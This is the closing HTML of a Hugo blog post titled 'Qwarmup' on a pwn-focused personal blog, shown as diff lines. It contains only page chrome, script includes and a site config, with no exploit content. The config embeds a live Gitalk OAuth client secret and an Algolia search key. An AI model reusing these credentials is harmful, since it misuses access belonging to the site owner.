+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://cnitlrt.github.io/qwarmup/" data-title="Qwarmup" data-hashtags="pwn"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://cnitlrt.github.io/qwarmup/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://cnitlrt.github.io/qwarmup/" data-title="Qwarmup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://cnitlrt.github.io/qwarmup/" data-title="Qwarmup"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://cnitlrt.github.io/qwarmup/" data-title="Qwarmup"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pwn/">pwn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/gooexec%E5%A4%8D%E7%8E%B0/" class="prev" rel="prev" title="Gooexec复现"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Gooexec复现</a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">cnitlrt</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"gitalk":{"admin":["cnitlrt"],"clientID":"2a776c3dc5f0100884f8","clientSecret":"148adb4f82e540cd5b1e77e16152f6844be4b240","id":"2023-07-04T22:20:17+08:00","owner":"cnitlrt","repo":"cnitlrt.github.io","title":"Qwarmup"}},"data":{"id-1":"cnitlrtの博客","id-2":"cnitlrtの博客"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
